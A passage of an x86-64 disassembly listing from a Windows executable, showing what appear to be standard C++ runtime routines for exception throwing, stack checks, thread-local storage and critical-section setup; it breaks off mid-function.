   140002cb0:	e8 8f 62 00 00       	call   0x140008f44
   140002cb5:	cc                   	int3
   140002cb6:	cc                   	int3
   140002cb7:	cc                   	int3
   140002cb8:	48 83 ec 28          	sub    $0x28,%rsp
   140002cbc:	e8 3b 02 00 00       	call   0x140002efc
   140002cc1:	48 83 c0 20          	add    $0x20,%rax
   140002cc5:	48 83 c4 28          	add    $0x28,%rsp
   140002cc9:	c3                   	ret
   140002cca:	cc                   	int3
   140002ccb:	cc                   	int3
   140002ccc:	48 83 ec 28          	sub    $0x28,%rsp
   140002cd0:	e8 27 02 00 00       	call   0x140002efc
   140002cd5:	48 83 c0 28          	add    $0x28,%rax
   140002cd9:	48 83 c4 28          	add    $0x28,%rsp
   140002cdd:	c3                   	ret
   140002cde:	cc                   	int3
   140002cdf:	cc                   	int3
   140002ce0:	48 83 ec 28          	sub    $0x28,%rsp
   140002ce4:	e8 5b 62 00 00       	call   0x140008f44
   140002ce9:	cc                   	int3
   140002cea:	cc                   	int3
   140002ceb:	cc                   	int3
   140002cec:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002cf1:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140002cf6:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140002cfb:	57                   	push   %rdi
   140002cfc:	48 83 ec 20          	sub    $0x20,%rsp
   140002d00:	80 79 08 00          	cmpb   $0x0,0x8(%rcx)
   140002d04:	48 8b fa             	mov    %rdx,%rdi
   140002d07:	48 8b d9             	mov    %rcx,%rbx
   140002d0a:	74 3f                	je     0x140002d4b
   140002d0c:	48 8b 09             	mov    (%rcx),%rcx
   140002d0f:	48 85 c9             	test   %rcx,%rcx
   140002d12:	74 37                	je     0x140002d4b
   140002d14:	e8 d7 14 01 00       	call   0x1400141f0
   140002d19:	48 8d 68 01          	lea    0x1(%rax),%rbp
   140002d1d:	48 8b cd             	mov    %rbp,%rcx
   140002d20:	e8 8b 5c 00 00       	call   0x1400089b0
   140002d25:	48 8b f0             	mov    %rax,%rsi
   140002d28:	48 8b c8             	mov    %rax,%rcx
   140002d2b:	48 85 c0             	test   %rax,%rax
   140002d2e:	74 14                	je     0x140002d44
   140002d30:	4c 8b 03             	mov    (%rbx),%r8
   140002d33:	48 8b d5             	mov    %rbp,%rdx
   140002d36:	e8 35 62 00 00       	call   0x140008f70
   140002d3b:	33 c9                	xor    %ecx,%ecx
   140002d3d:	48 89 37             	mov    %rsi,(%rdi)
   140002d40:	c6 47 08 01          	movb   $0x1,0x8(%rdi)
   140002d44:	e8 77 5c 00 00       	call   0x1400089c0
   140002d49:	eb 0a                	jmp    0x140002d55
   140002d4b:	48 8b 03             	mov    (%rbx),%rax
   140002d4e:	48 89 02             	mov    %rax,(%rdx)
   140002d51:	c6 42 08 00          	movb   $0x0,0x8(%rdx)
   140002d55:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140002d5a:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140002d5f:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140002d64:	48 83 c4 20          	add    $0x20,%rsp
   140002d68:	5f                   	pop    %rdi
   140002d69:	c3                   	ret
   140002d6a:	cc                   	int3
   140002d6b:	cc                   	int3
   140002d6c:	40 53                	rex push %rbx
   140002d6e:	48 83 ec 20          	sub    $0x20,%rsp
   140002d72:	80 79 08 00          	cmpb   $0x0,0x8(%rcx)
   140002d76:	48 8b d9             	mov    %rcx,%rbx
   140002d79:	74 08                	je     0x140002d83
   140002d7b:	48 8b 09             	mov    (%rcx),%rcx
   140002d7e:	e8 3d 5c 00 00       	call   0x1400089c0
   140002d83:	c6 43 08 00          	movb   $0x0,0x8(%rbx)
   140002d87:	48 c7 03 00 00 00 00 	movq   $0x0,(%rbx)
   140002d8e:	48 83 c4 20          	add    $0x20,%rsp
   140002d92:	5b                   	pop    %rbx
   140002d93:	c3                   	ret
   140002d94:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140002d99:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140002d9e:	57                   	push   %rdi
   140002d9f:	48 83 ec 50          	sub    $0x50,%rsp
   140002da3:	48 8b da             	mov    %rdx,%rbx
   140002da6:	48 8b f1             	mov    %rcx,%rsi
   140002da9:	bf 20 05 93 19       	mov    $0x19930520,%edi
   140002dae:	48 85 d2             	test   %rdx,%rdx
   140002db1:	74 1d                	je     0x140002dd0
   140002db3:	f6 02 10             	testb  $0x10,(%rdx)
   140002db6:	74 18                	je     0x140002dd0
   140002db8:	48 8b 09             	mov    (%rcx),%rcx
   140002dbb:	48 83 c1 f8          	add    $0xfffffffffffffff8,%rcx
   140002dbf:	48 8b 01             	mov    (%rcx),%rax
   140002dc2:	48 8b 58 30          	mov    0x30(%rax),%rbx
   140002dc6:	48 8b 40 40          	mov    0x40(%rax),%rax
   140002dca:	ff 15 40 25 01 00    	call   *0x12540(%rip)        # 0x140015310
   140002dd0:	33 c0                	xor    %eax,%eax
   140002dd2:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140002dd7:	48 85 db             	test   %rbx,%rbx
   140002dda:	74 22                	je     0x140002dfe
   140002ddc:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140002de1:	48 8b cb             	mov    %rbx,%rcx
   140002de4:	ff 15 5e 23 01 00    	call   *0x1235e(%rip)        # 0x140015148
   140002dea:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140002def:	f6 03 08             	testb  $0x8,(%rbx)
   140002df2:	75 05                	jne    0x140002df9
   140002df4:	48 85 c0             	test   %rax,%rax
   140002df7:	75 05                	jne    0x140002dfe
   140002df9:	bf 00 40 99 01       	mov    $0x1994000,%edi
   140002dfe:	ba 01 00 00 00       	mov    $0x1,%edx
   140002e03:	48 89 7c 24 28       	mov    %rdi,0x28(%rsp)
   140002e08:	4c 8d 4c 24 28       	lea    0x28(%rsp),%r9
   140002e0d:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   140002e12:	b9 63 73 6d e0       	mov    $0xe06d7363,%ecx
   140002e17:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   140002e1c:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140002e21:	44 8d 42 03          	lea    0x3(%rdx),%r8d
   140002e25:	ff 15 25 23 01 00    	call   *0x12325(%rip)        # 0x140015150
   140002e2b:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   140002e30:	48 8b 74 24 78       	mov    0x78(%rsp),%rsi
   140002e35:	48 83 c4 50          	add    $0x50,%rsp
   140002e39:	5f                   	pop    %rdi
   140002e3a:	c3                   	ret
   140002e3b:	cc                   	int3
   140002e3c:	cc                   	int3
   140002e3d:	cc                   	int3
   140002e3e:	cc                   	int3
   140002e3f:	cc                   	int3
   140002e40:	cc                   	int3
   140002e41:	cc                   	int3
   140002e42:	cc                   	int3
   140002e43:	cc                   	int3
   140002e44:	cc                   	int3
   140002e45:	cc                   	int3
   140002e46:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140002e4d:	00 00 00 
   140002e50:	cc                   	int3
   140002e51:	cc                   	int3
   140002e52:	cc                   	int3
   140002e53:	cc                   	int3
   140002e54:	cc                   	int3
   140002e55:	cc                   	int3
   140002e56:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140002e5d:	00 00 00 
   140002e60:	cc                   	int3
   140002e61:	cc                   	int3
   140002e62:	cc                   	int3
   140002e63:	cc                   	int3
   140002e64:	cc                   	int3
   140002e65:	cc                   	int3
   140002e66:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140002e6d:	00 00 00 
   140002e70:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140002e75:	48 89 54 24 18       	mov    %rdx,0x18(%rsp)
   140002e7a:	44 89 44 24 10       	mov    %r8d,0x10(%rsp)
   140002e7f:	49 c7 c1 20 05 93 19 	mov    $0x19930520,%r9
   140002e86:	e9 05 00 00 00       	jmp    0x140002e90
   140002e8b:	cc                   	int3
   140002e8c:	cc                   	int3
   140002e8d:	cc                   	int3
   140002e8e:	cc                   	int3
   140002e8f:	cc                   	int3
   140002e90:	c3                   	ret
   140002e91:	cc                   	int3
   140002e92:	cc                   	int3
   140002e93:	cc                   	int3
   140002e94:	cc                   	int3
   140002e95:	cc                   	int3
   140002e96:	cc                   	int3
   140002e97:	cc                   	int3
   140002e98:	cc                   	int3
   140002e99:	cc                   	int3
   140002e9a:	cc                   	int3
   140002e9b:	cc                   	int3
   140002e9c:	cc                   	int3
   140002e9d:	cc                   	int3
   140002e9e:	cc                   	int3
   140002e9f:	cc                   	int3
   140002ea0:	c3                   	ret
   140002ea1:	cc                   	int3
   140002ea2:	cc                   	int3
   140002ea3:	cc                   	int3
   140002ea4:	48 8b 05 55 24 01 00 	mov    0x12455(%rip),%rax        # 0x140015300
   140002eab:	48 8d 15 d2 f2 ff ff 	lea    -0xd2e(%rip),%rdx        # 0x140002184
   140002eb2:	48 3b c2             	cmp    %rdx,%rax
   140002eb5:	74 23                	je     0x140002eda
   140002eb7:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
   140002ebe:	00 00 
   140002ec0:	48 8b 89 98 00 00 00 	mov    0x98(%rcx),%rcx
   140002ec7:	48 3b 48 10          	cmp    0x10(%rax),%rcx
   140002ecb:	72 06                	jb     0x140002ed3
   140002ecd:	48 3b 48 08          	cmp    0x8(%rax),%rcx
   140002ed1:	76 07                	jbe    0x140002eda
   140002ed3:	b9 0d 00 00 00       	mov    $0xd,%ecx
   140002ed8:	cd 29                	int    $0x29
   140002eda:	c3                   	ret
   140002edb:	cc                   	int3
   140002edc:	48 83 ec 28          	sub    $0x28,%rsp
   140002ee0:	48 85 c9             	test   %rcx,%rcx
   140002ee3:	74 11                	je     0x140002ef6
   140002ee5:	48 8d 05 14 f2 01 00 	lea    0x1f214(%rip),%rax        # 0x140022100
   140002eec:	48 3b c8             	cmp    %rax,%rcx
   140002eef:	74 05                	je     0x140002ef6
   140002ef1:	e8 ca 5a 00 00       	call   0x1400089c0
   140002ef6:	48 83 c4 28          	add    $0x28,%rsp
   140002efa:	c3                   	ret
   140002efb:	cc                   	int3
   140002efc:	48 83 ec 28          	sub    $0x28,%rsp
   140002f00:	e8 13 00 00 00       	call   0x140002f18
   140002f05:	48 85 c0             	test   %rax,%rax
   140002f08:	74 05                	je     0x140002f0f
   140002f0a:	48 83 c4 28          	add    $0x28,%rsp
   140002f0e:	c3                   	ret
   140002f0f:	e8 dc 60 00 00       	call   0x140008ff0
   140002f14:	cc                   	int3
   140002f15:	cc                   	int3
   140002f16:	cc                   	int3
   140002f17:	cc                   	int3
   140002f18:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002f1d:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140002f22:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140002f27:	57                   	push   %rdi
   140002f28:	48 83 ec 20          	sub    $0x20,%rsp
   140002f2c:	83 3d 3d e1 01 00 ff 	cmpl   $0xffffffff,0x1e13d(%rip)        # 0x140021070
   140002f33:	75 07                	jne    0x140002f3c
   140002f35:	33 c0                	xor    %eax,%eax
   140002f37:	e9 90 00 00 00       	jmp    0x140002fcc
   140002f3c:	ff 15 2e 21 01 00    	call   *0x1212e(%rip)        # 0x140015070
   140002f42:	8b 0d 28 e1 01 00    	mov    0x1e128(%rip),%ecx        # 0x140021070
   140002f48:	8b f8                	mov    %eax,%edi
   140002f4a:	e8 65 03 00 00       	call   0x1400032b4
   140002f4f:	48 83 ca ff          	or     $0xffffffffffffffff,%rdx
   140002f53:	33 f6                	xor    %esi,%esi
   140002f55:	48 3b c2             	cmp    %rdx,%rax
   140002f58:	74 67                	je     0x140002fc1
   140002f5a:	48 85 c0             	test   %rax,%rax
   140002f5d:	74 05                	je     0x140002f64
   140002f5f:	48 8b f0             	mov    %rax,%rsi
   140002f62:	eb 5d                	jmp    0x140002fc1
   140002f64:	8b 0d 06 e1 01 00    	mov    0x1e106(%rip),%ecx        # 0x140021070
   140002f6a:	e8 8d 03 00 00       	call   0x1400032fc
   140002f6f:	85 c0                	test   %eax,%eax
   140002f71:	74 4e                	je     0x140002fc1
   140002f73:	ba 80 00 00 00       	mov    $0x80,%edx
   140002f78:	8d 4a 81             	lea    -0x7f(%rdx),%ecx
   140002f7b:	e8 d0 60 00 00       	call   0x140009050
   140002f80:	8b 0d ea e0 01 00    	mov    0x1e0ea(%rip),%ecx        # 0x140021070
   140002f86:	48 8b e8             	mov    %rax,%rbp
   140002f89:	48 8b d8             	mov    %rax,%rbx
   140002f8c:	48 85 c0             	test   %rax,%rax
   140002f8f:	74 21                	je     0x140002fb2
   140002f91:	48 8b d0             	mov    %rax,%rdx
   140002f94:	e8 63 03 00 00       	call   0x1400032fc
   140002f99:	85 c0                	test   %eax,%eax
   140002f9b:	74 0f                	je     0x140002fac
   140002f9d:	c7 43 78 fe ff ff ff 	movl   $0xfffffffe,0x78(%rbx)
   140002fa4:	48 8b de             	mov    %rsi,%rbx
   140002fa7:	48 8b f5             	mov    %rbp,%rsi
   140002faa:	eb 0d                	jmp    0x140002fb9
   140002fac:	8b 0d be e0 01 00    	mov    0x1e0be(%rip),%ecx        # 0x140021070
   140002fb2:	33 d2                	xor    %edx,%edx
   140002fb4:	e8 43 03 00 00       	call   0x1400032fc
   140002fb9:	48 8b cb             	mov    %rbx,%rcx
   140002fbc:	e8 ff 59 00 00       	call   0x1400089c0
   140002fc1:	8b cf                	mov    %edi,%ecx
   140002fc3:	ff 15 8f 21 01 00    	call   *0x1218f(%rip)        # 0x140015158
   140002fc9:	48 8b c6             	mov    %rsi,%rax
   140002fcc:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140002fd1:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140002fd6:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140002fdb:	48 83 c4 20          	add    $0x20,%rsp
   140002fdf:	5f                   	pop    %rdi
   140002fe0:	c3                   	ret
   140002fe1:	cc                   	int3
   140002fe2:	cc                   	int3
   140002fe3:	cc                   	int3
   140002fe4:	48 83 ec 28          	sub    $0x28,%rsp
   140002fe8:	48 8d 0d ed fe ff ff 	lea    -0x113(%rip),%rcx        # 0x140002edc
   140002fef:	e8 30 02 00 00       	call   0x140003224
   140002ff4:	89 05 76 e0 01 00    	mov    %eax,0x1e076(%rip)        # 0x140021070
   140002ffa:	83 f8 ff             	cmp    $0xffffffff,%eax
   140002ffd:	74 25                	je     0x140003024
   140002fff:	48 8d 15 fa f0 01 00 	lea    0x1f0fa(%rip),%rdx        # 0x140022100
   140003006:	8b c8                	mov    %eax,%ecx
   140003008:	e8 ef 02 00 00       	call   0x1400032fc
   14000300d:	85 c0                	test   %eax,%eax
   14000300f:	74 0e                	je     0x14000301f
   140003011:	c7 05 5d f1 01 00 fe 	movl   $0xfffffffe,0x1f15d(%rip)        # 0x140022178
   140003018:	ff ff ff 
   14000301b:	b0 01                	mov    $0x1,%al
   14000301d:	eb 07                	jmp    0x140003026
   14000301f:	e8 08 00 00 00       	call   0x14000302c
   140003024:	32 c0                	xor    %al,%al
   140003026:	48 83 c4 28          	add    $0x28,%rsp
   14000302a:	c3                   	ret
   14000302b:	cc                   	int3
   14000302c:	48 83 ec 28          	sub    $0x28,%rsp
   140003030:	8b 0d 3a e0 01 00    	mov    0x1e03a(%rip),%ecx        # 0x140021070
   140003036:	83 f9 ff             	cmp    $0xffffffff,%ecx
   140003039:	74 0f                	je     0x14000304a
   14000303b:	e8 2c 02 00 00       	call   0x14000326c
   140003040:	c7 05 26 e0 01 00 ff 	movl   $0xffffffff,0x1e026(%rip)        # 0x140021070
   140003047:	ff ff ff 
   14000304a:	b0 01                	mov    $0x1,%al
   14000304c:	48 83 c4 28          	add    $0x28,%rsp
   140003050:	c3                   	ret
   140003051:	cc                   	int3
   140003052:	cc                   	int3
   140003053:	cc                   	int3
   140003054:	40 53                	rex push %rbx
   140003056:	48 83 ec 20          	sub    $0x20,%rsp
   14000305a:	33 db                	xor    %ebx,%ebx
   14000305c:	48 8d 15 1d f1 01 00 	lea    0x1f11d(%rip),%rdx        # 0x140022180
   140003063:	45 33 c0             	xor    %r8d,%r8d
   140003066:	48 8d 0c 9b          	lea    (%rbx,%rbx,4),%rcx
   14000306a:	48 8d 0c ca          	lea    (%rdx,%rcx,8),%rcx
   14000306e:	ba a0 0f 00 00       	mov    $0xfa0,%edx
   140003073:	e8 d8 02 00 00       	call   0x140003350
   140003078:	85 c0                	test   %eax,%eax
   14000307a:	74 11                	je     0x14000308d
   14000307c:	ff 05 26 f1 01 00    	incl   0x1f126(%rip)        # 0x1400221a8
   140003082:	ff c3                	inc    %ebx
   140003084:	83 fb 01             	cmp    $0x1,%ebx
   140003087:	72 d3                	jb     0x14000305c
   140003089:	b0 01                	mov    $0x1,%al
   14000308b:	eb 07                	jmp    0x140003094
   14000308d:	e8 0a 00 00 00       	call   0x14000309c
   140003092:	32 c0                	xor    %al,%al
   140003094:	48 83 c4 20          	add    $0x20,%rsp
   140003098:	5b                   	pop    %rbx
   140003099:	c3                   	ret
   14000309a:	cc                   	int3
   14000309b:	cc                   	int3
   14000309c:	40 53                	rex push %rbx
   14000309e:	48 83 ec 20          	sub    $0x20,%rsp
   1400030a2:	8b 1d 00 f1 01 00    	mov    0x1f100(%rip),%ebx        # 0x1400221a8
   1400030a8:	eb 1d                	jmp    0x1400030c7
   1400030aa:	48 8d 05 cf f0 01 00 	lea    0x1f0cf(%rip),%rax        # 0x140022180
   1400030b1:	ff cb                	dec    %ebx
   1400030b3:	48 8d 0c 9b          	lea    (%rbx,%rbx,4),%rcx
   1400030b7:	48 8d 0c c8          	lea    (%rax,%rcx,8),%rcx
   1400030bb:	ff 15 af 20 01 00    	call   *0x120af(%rip)        # 0x140015170
   1400030c1:	ff 0d e1 f0 01 00    	decl   0x1f0e1(%rip)        # 0x1400221a8
   1400030c7:	85 db                	test   %ebx,%ebx
   1400030c9:	75 df                	jne    0x1400030aa
   1400030cb:	b0 01                	mov    $0x1,%al
   1400030cd:	48 83 c4 20          	add    $0x20,%rsp
   1400030d1:	5b                   	pop    %rbx
   1400030d2:	c3                   	ret
   1400030d3:	cc                   	int3
   1400030d4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400030d9:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1400030de:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400030e3:	57                   	push   %rdi
   1400030e4:	41 54                	push   %r12
   1400030e6:	41 55                	push   %r13
   1400030e8:	41 56                	push   %r14
   1400030ea:	41 57                	push   %r15
   1400030ec:	48 83 ec 20          	sub    $0x20,%rsp
   1400030f0:	8b f9                	mov    %ecx,%edi
   1400030f2:	4c 8d 3d 07 cf ff ff 	lea    -0x30f9(%rip),%r15        # 0x140000000
   1400030f9:	49 83 ce ff          	or     $0xffffffffffffffff,%r14
   1400030fd:	4d 8b e1             	mov    %r9,%r12
   140003100:	49 8b e8             	mov    %r8,%rbp
   140003103:	4c 8b ea             	mov    %rdx,%r13
   140003106:	49 8b 84 ff c8 21 02 	mov    0x221c8(%r15,%rdi,8),%rax
   14000310d:	00 
   14000310e:	90                   	nop
   14000310f:	49 3b c6             	cmp    %r14,%rax
   140003112:	0f 84 ae 00 00 00    	je     0x1400031c6
   140003118:	48 85 c0             	test   %rax,%rax
   14000311b:	0f 85 a7 00 00 00    	jne    0x1400031c8
   140003121:	4d 3b c1             	cmp    %r9,%r8
   140003124:	0f 84 94 00 00 00    	je     0x1400031be
   14000312a:	8b 75 00             	mov    0x0(%rbp),%esi
   14000312d:	49 8b 9c f7 b0 21 02 	mov    0x221b0(%r15,%rsi,8),%rbx
   140003134:	00 
   140003135:	90                   	nop
   140003136:	48 85 db             	test   %rbx,%rbx
   140003139:	74 0b                	je     0x140003146
   14000313b:	49 3b de             	cmp    %r14,%rbx
   14000313e:	0f 85 c1 00 00 00    	jne    0x140003205
   140003144:	eb 6b                	jmp    0x1400031b1
   140003146:	4d 8b bc f7 68 66 01 	mov    0x16668(%r15,%rsi,8),%r15
   14000314d:	00 
   14000314e:	33 d2                	xor    %edx,%edx
   140003150:	49 8b cf             	mov    %r15,%rcx
   140003153:	41 b8 00 08 00 00    	mov    $0x800,%r8d
   140003159:	ff 15 51 20 01 00    	call   *0x12051(%rip)        # 0x1400151b0
   14000315f:	48 8b d8             	mov    %rax,%rbx
   140003162:	48 85 c0             	test   %rax,%rax
   140003165:	75 7e                	jne    0x1400031e5
   140003167:	ff 15 03 1f 01 00    	call   *0x11f03(%rip)        # 0x140015070
   14000316d:	83 f8 57             	cmp    $0x57,%eax
   140003170:	75 2d                	jne    0x14000319f
   140003172:	44 8d 43 07          	lea    0x7(%rbx),%r8d
   140003176:	49 8b cf             	mov    %r15,%rcx
   140003179:	48 8d 15 98 35 01 00 	lea    0x13598(%rip),%rdx        # 0x140016718
   140003180:	e8 db 5e 00 00       	call   0x140009060
   140003185:	85 c0                	test   %eax,%eax
   140003187:	74 16                	je     0x14000319f
   140003189:	45 33 c0             	xor    %r8d,%r8d
   14000318c:	33 d2                	xor    %edx,%edx
   14000318e:	49 8b cf             	mov    %r15,%rcx
   140003191:	ff 15 19 20 01 00    	call   *0x12019(%rip)        # 0x1400151b0
   140003197:	48 8b d8             	mov    %rax,%rbx
   14000319a:	48 85 c0             	test   %rax,%rax
   14000319d:	75 46                	jne    0x1400031e5
   14000319f:	49 8b c6             	mov    %r14,%rax
   1400031a2:	4c 8d 3d 57 ce ff ff 	lea    -0x31a9(%rip),%r15        # 0x140000000
   1400031a9:	49 87 84 f7 b0 21 02 	xchg   %rax,0x221b0(%r15,%rsi,8)
   1400031b0:	00 
   1400031b1:	48 83 c5 04          	add    $0x4,%rbp
   1400031b5:	49 3b ec             	cmp    %r12,%rbp
   1400031b8:	0f 85 6c ff ff ff    	jne    0x14000312a
   1400031be:	4d 87 b4 ff c8 21 02 	xchg   %r14,0x221c8(%r15,%rdi,8)
   1400031c5:	00 
   1400031c6:	33 c0                	xor    %eax,%eax
   1400031c8:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   1400031cd:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   1400031d2:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   1400031d7:	48 83 c4 20          	add    $0x20,%rsp
   1400031db:	41 5f                	pop    %r15
   1400031dd:	41 5e                	pop    %r14
   1400031df:	41 5d                	pop    %r13
   1400031e1:	41 5c                	pop    %r12
   1400031e3:	5f                   	pop    %rdi
   1400031e4:	c3                   	ret
   1400031e5:	48 8b c3             	mov    %rbx,%rax
   1400031e8:	4c 8d 3d 11 ce ff ff 	lea    -0x31ef(%rip),%r15        # 0x140000000
   1400031ef:	49 87 84 f7 b0 21 02 	xchg   %rax,0x221b0(%r15,%rsi,8)
   1400031f6:	00 
   1400031f7:	48 85 c0             	test   %rax,%rax
   1400031fa:	74 09                	je     0x140003205
   1400031fc:	48 8b cb             	mov    %rbx,%rcx
   1400031ff:	ff 15 9b 1f 01 00    	call   *0x11f9b(%rip)        # 0x1400151a0
   140003205:	49 8b d5             	mov    %r13,%rdx
   140003208:	48 8b cb             	mov    %rbx,%rcx
   14000320b:	ff 15 97 1f 01 00    	call   *0x11f97(%rip)        # 0x1400151a8
   140003211:	48 85 c0             	test   %rax,%rax
   140003214:	74 a8                	je     0x1400031be
   140003216:	48 8b c8             	mov    %rax,%rcx
   140003219:	49 87 8c ff c8 21 02 	xchg   %rcx,0x221c8(%r15,%rdi,8)
   140003220:	00 
   140003221:	eb a5                	jmp    0x1400031c8
   140003223:	cc                   	int3
   140003224:	40 53                	rex push %rbx
   140003226:	48 83 ec 20          	sub    $0x20,%rsp
   14000322a:	48 8b d9             	mov    %rcx,%rbx
   14000322d:	4c 8d 0d fc 34 01 00 	lea    0x134fc(%rip),%r9        # 0x140016730
   140003234:	33 c9                	xor    %ecx,%ecx
   140003236:	4c 8d 05 eb 34 01 00 	lea    0x134eb(%rip),%r8        # 0x140016728
   14000323d:	48 8d 15 ec 34 01 00 	lea    0x134ec(%rip),%rdx        # 0x140016730
   140003244:	e8 8b fe ff ff       	call   0x1400030d4
   140003249:	48 85 c0             	test   %rax,%rax
   14000324c:	74 0f                	je     0x14000325d
   14000324e:	48 8b cb             	mov    %rbx,%rcx
   140003251:	48 83 c4 20          	add    $0x20,%rsp
   140003255:	5b                   	pop    %rbx
   140003256:	48 ff 25 b3 20 01 00 	rex.W jmp *0x120b3(%rip)        # 0x140015310
   14000325d:	48 83 c4 20          	add    $0x20,%rsp
   140003261:	5b                   	pop    %rbx
   140003262:	48 ff 25 17 1f 01 00 	rex.W jmp *0x11f17(%rip)        # 0x140015180
   140003269:	cc                   	int3
   14000326a:	cc                   	int3
   14000326b:	cc                   	int3
   14000326c:	40 53                	rex push %rbx
   14000326e:	48 83 ec 20          	sub    $0x20,%rsp
   140003272:	8b d9                	mov    %ecx,%ebx
   140003274:	4c 8d 0d cd 34 01 00 	lea    0x134cd(%rip),%r9        # 0x140016748
   14000327b:	b9 01 00 00 00       	mov    $0x1,%ecx
   140003280:	4c 8d 05 b9 34 01 00 	lea    0x134b9(%rip),%r8        # 0x140016740
   140003287:	48 8d 15 ba 34 01 00 	lea    0x134ba(%rip),%rdx        # 0x140016748
   14000328e:	e8 41 fe ff ff       	call   0x1400030d4
   140003293:	8b cb                	mov    %ebx,%ecx
   140003295:	48 85 c0             	test   %rax,%rax
   140003298:	74 0c                	je     0x1400032a6
   14000329a:	48 83 c4 20          	add    $0x20,%rsp
   14000329e:	5b                   	pop    %rbx
   14000329f:	48 ff 25 6a 20 01 00 	rex.W jmp *0x1206a(%rip)        # 0x140015310
   1400032a6:	48 83 c4 20          	add    $0x20,%rsp
   1400032aa:	5b                   	pop    %rbx
   1400032ab:	48 ff 25 e6 1e 01 00 	rex.W jmp *0x11ee6(%rip)        # 0x140015198
   1400032b2:	cc                   	int3
   1400032b3:	cc                   	int3
   1400032b4:	40 53                	rex push %rbx
   1400032b6:	48 83 ec 20          	sub    $0x20,%rsp
   1400032ba:	8b d9                	mov    %ecx,%ebx
   1400032bc:	4c 8d 0d 95 34 01 00 	lea    0x13495(%rip),%r9        # 0x140016758
   1400032c3:	b9 02 00 00 00       	mov    $0x2,%ecx
   1400032c8:	4c 8d 05 81 34 01 00 	lea    0x13481(%rip),%r8        # 0x140016750
   1400032cf:	48 8d 15 82 34 01 00 	lea    0x13482(%rip),%rdx        # 0x140016758
   1400032d6:	e8 f9 fd ff ff       	call   0x1400030d4
   1400032db:	8b cb                	mov    %ebx,%ecx
   1400032dd:	48 85 c0             	test   %rax,%rax
   1400032e0:	74 0c                	je     0x1400032ee
   1400032e2:	48 83 c4 20          	add    $0x20,%rsp
   1400032e6:	5b                   	pop    %rbx
   1400032e7:	48 ff 25 22 20 01 00 	rex.W jmp *0x12022(%rip)        # 0x140015310
   1400032ee:	48 83 c4 20          	add    $0x20,%rsp
   1400032f2:	5b                   	pop    %rbx
   1400032f3:	48 ff 25 8e 1e 01 00 	rex.W jmp *0x11e8e(%rip)        # 0x140015188
   1400032fa:	cc                   	int3
   1400032fb:	cc                   	int3
   1400032fc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003301:	57                   	push   %rdi
   140003302:	48 83 ec 20          	sub    $0x20,%rsp
   140003306:	48 8b da             	mov    %rdx,%rbx
   140003309:	4c 8d 0d 60 34 01 00 	lea    0x13460(%rip),%r9        # 0x140016770
   140003310:	8b f9                	mov    %ecx,%edi
   140003312:	48 8d 15 57 34 01 00 	lea    0x13457(%rip),%rdx        # 0x140016770
   140003319:	b9 03 00 00 00       	mov    $0x3,%ecx
   14000331e:	4c 8d 05 43 34 01 00 	lea    0x13443(%rip),%r8        # 0x140016768
   140003325:	e8 aa fd ff ff       	call   0x1400030d4
   14000332a:	48 8b d3             	mov    %rbx,%rdx
   14000332d:	8b cf                	mov    %edi,%ecx
   14000332f:	48 85 c0             	test   %rax,%rax
   140003332:	74 08                	je     0x14000333c
   140003334:	ff 15 d6 1f 01 00    	call   *0x11fd6(%rip)        # 0x140015310
   14000333a:	eb 06                	jmp    0x140003342
   14000333c:	ff 15 4e 1e 01 00    	call   *0x11e4e(%rip)        # 0x140015190
   140003342:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003347:	48 83 c4 20          	add    $0x20,%rsp
   14000334b:	5f                   	pop    %rdi
   14000334c:	c3                   	ret
   14000334d:	cc                   	int3
   14000334e:	cc                   	int3
   14000334f:	cc                   	int3
   140003350:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003355:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000335a:	57                   	push   %rdi
   14000335b:	48 83 ec 20          	sub    $0x20,%rsp
   14000335f:	41 8b f0             	mov    %r8d,%esi
   140003362:	4c 8d 0d 1f 34 01 00 	lea    0x1341f(%rip),%r9        # 0x140016788
   140003369:	8b da                	mov    %edx,%ebx
   14000336b:	4c 8d 05 0e 34 01 00 	lea    0x1340e(%rip),%r8        # 0x140016780
   140003372:	48 8b f9             	mov    %rcx,%rdi
   140003375:	48 8d 15 0c 34 01 00 	lea    0x1340c(%rip),%rdx        # 0x140016788
   14000337c:	b9 04 00 00 00       	mov    $0x4,%ecx
   140003381:	e8 4e fd ff ff       	call   0x1400030d4
   140003386:	8b d3                	mov    %ebx,%edx
   140003388:	48 8b cf             	mov    %rdi,%rcx
   14000338b:	48 85 c0             	test   %rax,%rax
   14000338e:	74 0b                	je     0x14000339b
